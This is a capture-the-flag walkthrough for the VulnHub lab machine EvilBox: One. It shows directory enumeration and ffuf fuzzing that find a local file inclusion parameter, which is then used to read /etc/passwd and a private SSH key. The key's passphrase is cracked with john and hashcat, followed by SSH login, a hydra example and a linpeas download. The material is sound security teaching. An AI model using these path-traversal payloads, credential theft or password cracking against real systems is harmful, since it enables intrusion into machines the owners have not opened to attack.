
### [VulnHub - Machine Information Page](https://www.vulnhub.com/entry/evilbox-one,736/)

### [YouTube - Evilbox: 1 || VulnHub Complete Walkthrough](https://www.youtube.com/watch?v=jehjt_iCMsk)

---
### About Release
- **Name**: EvilBox: One
- **Date release**: 16 Aug 2021
- **Author**: [Mowree](https://www.vulnhub.com/author/mowree,814/)
- **Series**: [EvilBox](https://www.vulnhub.com/series/evilbox,496/)

### Download
Please remember that VulnHub is a free community resource so we are unable to check the machines that are provided to us. Before you download, please read our FAQs sections dealing with the dangers of running unknown VMs and our suggestions for “protecting yourself and your network. If you understand the risks, please download!

- **EvilBox---One.ova** (Size: 712 MB)
- **Download (Mirror)**: [https://download.vulnhub.com/evilbox/EvilBox---One.ova](https://download.vulnhub.com/evilbox/EvilBox---One.ova)

### Description
Difficulty: Easy
This works better with VirtualBox rather than VMware

### File Information
- **Filename**: EvilBox---One.ova
- **File size**: 712 MB
- **MD5**: C3A65197B891713731E6BB791D7AD259
- **SHA1**: EE44F1720A5D80B389AAA8207FE99F8C8C48C509

### Virtual Machine
- **Format**: Virtual Machine (Virtualbox - OVA)
- **Operating System**: Linux

### Networking
- **DHCP service**: Enabled
- **IP address**: Automatically assign

---


# Installation 🔌💻🖥️🛜💾🔌

This is a ova-file, should this should be pretty straightforward, just remember the Host-Only adapter.


![](evilbox_login.png)



---
---

# Enumeration

## netdiscover & nmap


```bash
# sudo netdiscover -i eth1
# sudo netdiscover -i eth1 -r 192.168.56.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                       
                                                                                                                                     
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                     
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0b      1      60  Unknown vendor                                                                    
 192.168.56.2    08:00:27:d4:ea:6e      1      60  PCS Systemtechnik GmbH                                                            
 192.168.56.37   08:00:27:14:58:b5      1      60  PCS Systemtechnik GmbH



# nmap -sC -sV 192.168.56.34 
# nmap -sC -sV 192.168.56.34 -p- 
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 192.168.56.37 -p-   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-12 23:16 CET
Nmap scan report for 192.168.56.37
Host is up (0.0012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:14:58:B5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.63 seconds
```

We can confirm that the following ports are available
- 22/TCP - SSH - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
- 80/TCP - HTTP - Apache httpd 2.4.38 ((Debian)

It's your typical basic apache server template, nothing fancy...
searching for ``http://192.168.56.37/robots.txt`` we found this message `Hello H4x0r`, maybe that is a username for the SSH or just a red herring 🐟?



## GoBuster

```bash
# gobuster dir -u http://192.168.56.37/ -w /usr/share/wordlists/dirb/common.txt  
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.56.37/ -w /usr/share/wordlists/dirb/common.txt  
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.37/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 12]
/secret               (Status: 301) [Size: 315] [--> http://192.168.56.37/secret/]
/server-status        (Status: 403) [Size: 278]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================
```

If we go and check the `secret` page, it would be totally white/blank, but if we look at the source code, there is a sequence of numberes
```bash
# view-source:http://192.168.56.37/secret/
1
2
3
4
5
```

Let's use gobuster bit deeper


```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.56.37/secret -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.37/secret
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/evil.php             (Status: 200) [Size: 0]
/index.html           (Status: 200) [Size: 4]
/index.html           (Status: 200) [Size: 4]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```


If we go and check the `secret/evil.php` page, it would be totally white/blank, but if we look at the source code, there is absolutely nothing!

### Detecting Local File Inclusion (LFI) Vulnerabilities with FFUF

#Fussing #ffuf

["ffuf - Fuzz Faster U Fool - Fast web fuzzer written in Go"](https://github.com/ffuf/ffuf)

![Okay?](https://raw.githubusercontent.com/ffuf/ffuf/master/_img/ffuf_run_logo_600.png)




```bash
# How to Ffuf
┌──(kali㉿kali)-[~]
└─$ ffuf
Encountered error(s): 2 errors occurred.
        * -u flag or -request flag is required
        * Either -w or --input-cmd flag is required

Fuzz Faster U Fool - v2.1.0-dev

HTTP OPTIONS:
  -H                  Header `"Name: Value"`, separated by colon. Multiple -H flags are accepted.
  -X                  HTTP method to use
  -b                  Cookie data `"NAME1=VALUE1; NAME2=VALUE2"` for copy as curl functionality.
  -cc                 Client cert for authentication. Client key needs to be defined as well for this to work
  -ck                 Client key for authentication. Client certificate needs to be defined as well for this to work
  -d                  POST data
  -http2              Use HTTP2 protocol (default: false)
  -ignore-body        Do not fetch the response content. (default: false)
  -r                  Follow redirects (default: false)
  -raw                Do not encode URI (default: false)
  -recursion          Scan recursively. Only FUZZ keyword is supported, and URL (-u) has to end in it. (default: false)
  -recursion-depth    Maximum recursion depth. (default: 0)
  -recursion-strategy Recursion strategy: "default" for a redirect based, and "greedy" to recurse on all matches (default: default)
  -replay-proxy       Replay matched requests using this proxy.
  -sni                Target TLS SNI, does not support FUZZ keyword
  -timeout            HTTP request timeout in seconds. (default: 10)
  -u                  Target URL
  -x                  Proxy URL (SOCKS5 or HTTP). For example: http://127.0.0.1:8080 or socks5://127.0.0.1:8080

GENERAL OPTIONS:
  -V                  Show version information. (default: false)
  -ac                 Automatically calibrate filtering options (default: false)
  -acc                Custom auto-calibration string. Can be used multiple times. Implies -ac
  -ach                Per host autocalibration (default: false)
  -ack                Autocalibration keyword (default: FUZZ)
  -acs                Custom auto-calibration strategies. Can be used multiple times. Implies -ac
  -c                  Colorize output. (default: false)
  -config             Load configuration from a file
  -json               JSON output, printing newline-delimited JSON records (default: false)
  -maxtime            Maximum running time in seconds for entire process. (default: 0)
  -maxtime-job        Maximum running time in seconds per job. (default: 0)
  -noninteractive     Disable the interactive console functionality (default: false)
  -p                  Seconds of `delay` between requests, or a range of random delay. For example "0.1" or "0.1-2.0"
  -rate               Rate of requests per second (default: 0)
  -s                  Do not print additional information (silent mode) (default: false)
  -sa                 Stop on all error cases. Implies -sf and -se. (default: false)
  -scraperfile        Custom scraper file path
  -scrapers           Active scraper groups (default: all)
  -se                 Stop on spurious errors (default: false)
  -search             Search for a FFUFHASH payload from ffuf history
  -sf                 Stop when > 95% of responses return 403 Forbidden (default: false)
  -t                  Number of concurrent threads. (default: 40)
  -v                  Verbose output, printing full URL and redirect location (if any) with the results. (default: false)

MATCHER OPTIONS:
  -mc                 Match HTTP status codes, or "all" for everything. (default: 200-299,301,302,307,401,403,405,500)
  -ml                 Match amount of lines in response
  -mmode              Matcher set operator. Either of: and, or (default: or)
  -mr                 Match regexp
  -ms                 Match HTTP response size
  -mt                 Match how many milliseconds to the first response byte, either greater or less than. EG: >100 or <100
  -mw                 Match amount of words in response

FILTER OPTIONS:
  -fc                 Filter HTTP status codes from response. Comma separated list of codes and ranges
  -fl                 Filter by amount of lines in response. Comma separated list of line counts and ranges
  -fmode              Filter set operator. Either of: and, or (default: or)
  -fr                 Filter regexp
  -fs                 Filter HTTP response size. Comma separated list of sizes and ranges
  -ft                 Filter by number of milliseconds to the first response byte, either greater or less than. EG: >100 or <100
  -fw                 Filter by amount of words in response. Comma separated list of word counts and ranges

INPUT OPTIONS:
  -D                  DirSearch wordlist compatibility mode. Used in conjunction with -e flag. (default: false)
  -e                  Comma separated list of extensions. Extends FUZZ keyword.
  -enc                Encoders for keywords, eg. 'FUZZ:urlencode b64encode'
  -ic                 Ignore wordlist comments (default: false)
  -input-cmd          Command producing the input. --input-num is required when using this input method. Overrides -w.
  -input-num          Number of inputs to test. Used in conjunction with --input-cmd. (default: 100)
  -input-shell        Shell to be used for running command
  -mode               Multi-wordlist operation mode. Available modes: clusterbomb, pitchfork, sniper (default: clusterbomb)
  -request            File containing the raw http request
  -request-proto      Protocol to use along with raw request (default: https)
  -w                  Wordlist file path and (optional) keyword separated by colon. eg. '/path/to/wordlist:KEYWORD'

OUTPUT OPTIONS:
  -debug-log          Write all of the internal logging to the specified file.
  -o                  Write output to file
  -od                 Directory path to store matched results to.
  -of                 Output file format. Available formats: json, ejson, html, md, csv, ecsv (or, 'all' for all formats) (default: json)
  -or                 Don't create the output file if we don't have results (default: false)

EXAMPLE USAGE:
  Fuzz file paths from wordlist.txt, match all responses but filter out those with content-size 42.
  Colored, verbose output.
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v

  Fuzz Host-header, match HTTP 200 responses.
    ffuf -w hosts.txt -u https://example.org/ -H "Host: FUZZ" -mc 200

  Fuzz POST JSON data. Match all responses not containing text "error".
    ffuf -w entries.txt -u https://example.org/ -X POST -H "Content-Type: application/json" \
      -d '{"name": "FUZZ", "anotherkey": "anothervalue"}' -fr "error"

  Fuzz multiple locations. Match only responses reflecting the value of "VAL" keyword. Colored.
    ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr "VAL" -c

  More information and examples: https://github.com/ffuf/ffuf

Encountered error(s): 2 errors occurred.
        * -u flag or -request flag is required
        * Either -w or --input-cmd flag is required
```

```bash
# http://192.168.56.37/secret/evil.php?file=../../../../../etc/passwd
ffuf -u "http://192.168.56.37/secret/evil.php?FUZZ=../../../../../etc/passwd" -w

# -c : Color output
# -r : Follow redirect
# -fs : Filter response based on HTTP status 0 - Show all responses
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.56.37/secret/evil.php?FUZZ=../../../../../etc/passwd" -w "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" -c -r -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.37/secret/evil.php?FUZZ=../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

command                 [Status: 200, Size: 1398, Words: 13, Lines: 27, Duration: 4ms]
:: Progress: [220560/220560] :: Job [1/1] :: 3030 req/sec :: Duration: [0:01:43] :: Errors: 0 ::

```

We can now conclude, that the word "command" is a parameter for the URL.

So we will go on the browser again and write "http://192.168.56.37/secret/evil.php?command=../../../../../etc/passwd" and here we get the text of the "password"

```bash
# Content of /etc/passwd
|   |
|---|
|root:x:0:0:root:/root:/bin/bash|
|daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin|
|bin:x:2:2:bin:/bin:/usr/sbin/nologin|
|sys:x:3:3:sys:/dev:/usr/sbin/nologin|
|sync:x:4:65534:sync:/bin:/bin/sync|
|games:x:5:60:games:/usr/games:/usr/sbin/nologin|
|man:x:6:12:man:/var/cache/man:/usr/sbin/nologin|
|lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin|
|mail:x:8:8:mail:/var/mail:/usr/sbin/nologin|
|news:x:9:9:news:/var/spool/news:/usr/sbin/nologin|
|uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin|
|proxy:x:13:13:proxy:/bin:/usr/sbin/nologin|
|www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin|
|backup:x:34:34:backup:/var/backups:/usr/sbin/nologin|
|list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin|
|irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin|
|gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin|
|nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin|
|_apt:x:100:65534::/nonexistent:/usr/sbin/nologin|
|systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin|
|systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin|
|systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin|
|messagebus:x:104:110::/nonexistent:/usr/sbin/nologin|
|sshd:x:105:65534::/run/sshd:/usr/sbin/nologin|
|mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash|
|systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin|
```

#### `mowree` seems like a username, which we could use for SSH login 💚💚💚

**SSH Default File Path on Linux**
Version 1: ~/. ssh/identity
Version 2: ~/. ssh/id_rsa || ~/. ssh/id_dsa

So as before with the `/etc/passwd` we will go to ``home/mowree/.ssh/id_rsa``

"http://192.168.56.37/secret/evil.php?command=../../../../../home/mowree/.shh/id_rsa"

http://192.168.56.37/secret/evil.php?command=../../../../../home/mowree/.ssh/id_rsa

```bash
# The content of home/mowree/.ssh/id_rsa
|   |
|---|
|-----BEGIN RSA PRIVATE KEY-----|
|Proc-Type: 4,ENCRYPTED|
|DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E|
||
|uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6|
|hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe|
|o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb|
|+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot|
|b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k|
|HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg|
|9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY|
|zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu|
|rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1|
|tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs|
|94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm|
|VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7|
|Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P|
|hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr|
|Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR|
|IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R|
|MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS|
|62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69|
|Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8|
|p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C|
|pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X|
|KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa|
|i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp|
|4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/|
|8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==|
|-----END RSA PRIVATE KEY-----|
||
```

save the content as a txt file in your home directory as `id_rsa`

---
---

# Foothold 🦶

## SSH

```bash
# prepare file
┌──(kali㉿kali)-[~]
└─$ ls -al id_rsa 
-rw-rw-r-- 1 kali kali 1743 Nov 20 07:11 id_rsa

┌──(kali㉿kali)-[~]
└─$ chmod 600 id_rsa 

┌──(kali㉿kali)-[~]
└─$ ls -al id_rsa   
-rw------- 1 kali kali 1743 Nov 20 07:11 id_rsa

# SSH - But we need passphrase
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa mowree@192.168.56.37        
The authenticity of host '192.168.56.37 (192.168.56.37)' can't be established.
ED25519 key fingerprint is: SHA256:0x3tf1iiGyqlMEM47ZSWSJ4hLBu7FeVaeaT2FxM7iq8
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.37' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa':
```

We will use the tool `ssh2john` and extract the hash

```bash
# Extract the hash from the id_rsa
┌──(kali㉿kali)-[~]
└─$ ssh2john id_rsa > evil_ssh_hash

┌──(kali㉿kali)-[~]
└─$ sudo john evil_ssh_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (id_rsa)     
1g 0:00:00:00 DONE (2025-11-20 07:24) 25.00g/s 32000p/s 32000c/s 32000C/s ramona..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### The password is `unicorn`

#### Bonus - How to do it with hashcat

```bash
# to use the file as "evil_ssh_hash" you have to remove the part "id_rsa:" so the file only contains the hash itself
┌──(kali㉿kali)-[~/Desktop/Crack the hash 2]
└─$ hashcat -m 22911 raw_ssh rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i7-13700HX, 2317/4634 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (4369 MB free)

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$sshng$0$8$9fb14b3f3d04e90e$1192$bae426d821487bf7994f9a4dc90ebe2b551aa7f15859cb04925cce36dfb1e003ba1668c5991f11529c0c1eeae66d10ba86aca88aff2f8294204113d83332774204bd9140867600b9f9c5e5342493fc6290392e103103144da723659f04273a1ea3bfbbb4207c664fec5bb6fc7379b80b3d02984e66badf19cae4e70744809460107d98eab2576e8078d9d6dd7b9a575bfa0cd618152629338b3bf81cb80642f938fe0681a46f68277a2300f39a095facbf76aab822bd744289bed2d385b2ea2d6fb03d5d3b9b80496c954126f1f196eb8917df1dcbb5746ca11d769fe92b67a4fe20e4f34e13161314755b1a7851bfe41ed5d3cddbc34016e005fe21d3cab208ec4611a5591ca695ff29c69cebf4ce1959fb3d7add28e9a553cad3b1f86dd2e0f520b5a2662e9ef260ba7312d004c2f2e016ce8439233e646b487e34ea1f52b56d7c967f3a786d30a5be33de3c1209d8ce1ec57ead4a94c8d91f19c84b76dd725e0c155d05dc7a71fa20ee92fc9f79e58aba8794bafccd7d52953d92aac9a26ead1aa7c585bf7f37499bef1756231071c81001a67e65bdab556d20ca27ec1228314a175a4f93c674914a2952d2f9b0f5b47072e943a12829f71fc79db57c2f64dfbd3c3183cd4704a6bf716022e4987fa172bd3aca952d96ef54ade3cb87f5ecf782804cae23a0e216ecef069cf74a06223edc7934a9a90bd64c9841506d323293c8433cc9172cb0666bfcc7559d85a6543e6911d0326ca05f046ff156ed82477efc0512b3949922caa4635d02e814c543cf7237d11a636e97d842cd839b633b31bdbac0d416e1f7fba9edf42bf231ae6ecc7e424fcee7909528bde081d768fbe5e2fc82a0f2d6f3d273b0d0ecbc6f0f86b9164693c8c29cca76d30fc106e43eee3292a80a91861199595f5fca1e8acdc2d610a3aafa772ed87440323eed286b15be70d27d2a7c34f8a34dd4d4fba7da2a9d23833e8836541784b4043df103fce9f9df7c3671a546a32624af92b66a912089370d1464bccc710a6d768360e8b515204f6fa681a6779eae797aacd7461d14d4fe507e13be57c5b36d5ce13faf9132daa05b52f4880801e029d322e77a0e95d0b51f65ffff5a96b5dafb89d67035b61a82a3963c4e28d2bc8d7b39f129d2eb62ebbdc3595689198ea97c5e2ef12f45db124d20b6922d2ed5fbc401cb153559b78507e9cb0e730ab9bef2401a1ebd43f8a4cf95e6c90fb00f0404403ccd78e8fdcc1875fb5ceb766b749bb848e569c825a904336bea0aa96e379084b38bbca7589afa678bd095652e86df9d48318b74339bd485da989f41d78f554e065c684838151fdf86edb348842037feab1d82a70c6801ed6d3262279597d1dac2959487872017c7abf84f7f63c7bd4d1ca73ecccdf637eb1f6e7d9739307d890d3f172911002774b4a4ca653ff65c5e344b3a5112417794436caf6fad66fb3a61834423587d77d609da048855223d672e74da8bdf7ebd87707bcfbc9c9ab8fd65e190df954d85e77444f61f47c5353140a9b9361c6cbafbaa92ff843a0d55714c7769e038364119d14e3a7be1d435359ee3bae72f5bb0c1144f822bcd1d92bafdc85cb26d552a0701eb9a64151462e44b623ff243958c88c52a4190e2b35158a568a3f1da46823f7f61bab5b12239572550c4fc8aeb4083c4b854:unicorn
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22911 (RSA/DSA/EC/OpenSSH Private Keys ($0$))
Hash.Target......: $sshng$0$8$9fb14b3f3d04e90e$1192$bae426d821487bf799...c4b854
Time.Started.....: Thu Nov 20 07:34:58 2025 (0 secs)
Time.Estimated...: Thu Nov 20 07:34:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1438.1 kH/s (1.19ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8192/14344385 (0.06%)
Rejected.........: 0/8192 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> whitetiger
Hardware.Mon.#01.: Util:  6%

Started: Thu Nov 20 07:34:46 2025
Stopped: Thu Nov 20 07:34:59 2025

```


Alright! finally time for SSH

```bash
# ssh as usual does not work
┌──(kali㉿kali)-[~]
└─$ ssh mowree@192.168.56.37         
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mowree@192.168.56.37's password: 
Permission denied, please try again.'

# since the id_rsa passphrase is not the same as userpassword
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa mowree@192.168.56.37                                 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Enter passphrase for key 'id_rsa': 
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ 

# Lets get the user flag! 🚩
mowree@EvilBoxOne:~$ ls
user.txt                                                                                     
mowree@EvilBoxOne:~$ cat user.txt
56Rbp0soobpzWSVzKh9YOvzGLgtPZQ  
```

![](evil_userflag.png)


Can you have done it with hydra?

```bash
#Hydra?
hydra -l mowree -P rockyou.txt ssh://192.168.56.37
```


---
---

# Privilege Escalation


```bash
# 
mowree@EvilBoxOne:~$ id                                                                              
uid=1000(mowree) gid=1000(mowree) grupos=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)                                                                                               
mowree@EvilBoxOne:~$ sudo -l                                                                                        
-bash: sudo: orden no encontrada 

```

## LinPeas


![peace](https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/images/peass.png)


```bash
# Download linpeas from Github
# https://github.com/peass-ng/PEASS-ng


# prepare python3 server for file transfer (kali)
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.56.37 - - [20/Nov/2025 19:53:39] "GET /linpeas.sh HTTP/1.1" 200 -



# On target - navigate to ../tmp
mowree@EvilBoxOne:~$ cd /tmp
mowree@EvilBoxOne:/tmp$ wget http://192.168.56.52:8080/linpeas.sh
--2025-11-20 19:53:38--  http://192.168.56.52:8080/linpeas.sh
Conectando con 192.168.56.52:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 860337 (840K) [application/x-sh]
Grabando a: “linpeas.sh”

linpeas.sh                        100%[===========================================================>] 840,17K  --.-KB/s    en 0,06s   

2025-11-20 19:53:38 (13,7 MB/s) - “linpeas.sh” guardado [860337/860337]

mowree@EvilBoxOne:/tmp$ ls -al linpeas.sh
-rw-r--r-- 1 mowree mowree 860337 jul  6  2024 linpeas.sh
mowree@EvilBoxOne:/tmp$ chmod +x linpeas.sh 
mowree@EvilBoxOne:/tmp$ ls -al linpeas.sh
-rwxr-xr-x 1 mowree mowree 860337 jul  6  2024 linpeas.sh
```


## WALL OF TEXT - OUTPUT FROM LINPEAS.SH

```bash

mowree@EvilBoxOne:/tmp$ ./linpeas.sh 


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
